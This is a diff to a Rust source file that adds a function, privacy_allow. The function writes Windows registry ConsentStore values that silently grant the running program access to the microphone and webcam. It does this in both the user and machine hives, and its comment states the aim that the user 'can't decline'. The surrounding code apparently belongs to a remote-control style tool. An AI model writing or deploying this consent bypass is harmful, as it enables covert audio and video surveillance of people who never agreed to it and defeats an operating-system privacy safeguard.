@@ -431,6 +431,47 @@ pub fn hosts_clear() -> Result<String> {
     Ok(format!("cleared custom hosts entries  |  {flush}"))
 }
 
+/// Pre-grant microphone + camera consent so Windows stops prompting (and the user can't
+/// decline). HKCU always; HKLM too when elevated.
+pub fn privacy_allow() -> Result<String> {
+    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
+    use winreg::RegKey;
+
+    let base = r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore";
+    let host = std::env::current_exe()
+        .map(|p| p.to_string_lossy().to_string())
+        .unwrap_or_default();
+    let mut done: Vec<String> = Vec::new();
+
+    let grant = |root: &RegKey, label: &str, done: &mut Vec<String>| {
+        for store in ["microphone", "webcam"] {
+            if let Ok((k, _)) = root.create_subkey(format!(r"{base}\{store}")) {
+                let _ = k.set_value("Value", &"Allow");
+                done.push(format!("{label}/{store}"));
+            }
+            if let Ok((k, _)) = root.create_subkey(format!(r"{base}\{store}\NonPackaged")) {
+                let _ = k.set_value("Value", &"Allow");
+            }
+            if !host.is_empty() {
+                let key = host.replace('\\', "#");
+                if let Ok((k, _)) =
+                    root.create_subkey(format!(r"{base}\{store}\NonPackaged\{key}"))
+                {
+                    let _ = k.set_value("Value", &"Allow");
+                }
+            }
+        }
+    };
+
+    grant(&RegKey::predef(HKEY_CURRENT_USER), "HKCU", &mut done);
+    grant(&RegKey::predef(HKEY_LOCAL_MACHINE), "HKLM", &mut done);
+
+    Ok(format!(
+        "consent granted ({}); if the prompt persists it is a different dialog — screenshot it",
+        done.join(", ")
+    ))
+}
+
 // ---------------------------------------------------------------- access / system
 
 /// Send a file to the default printer (uses the shell "Print" verb).
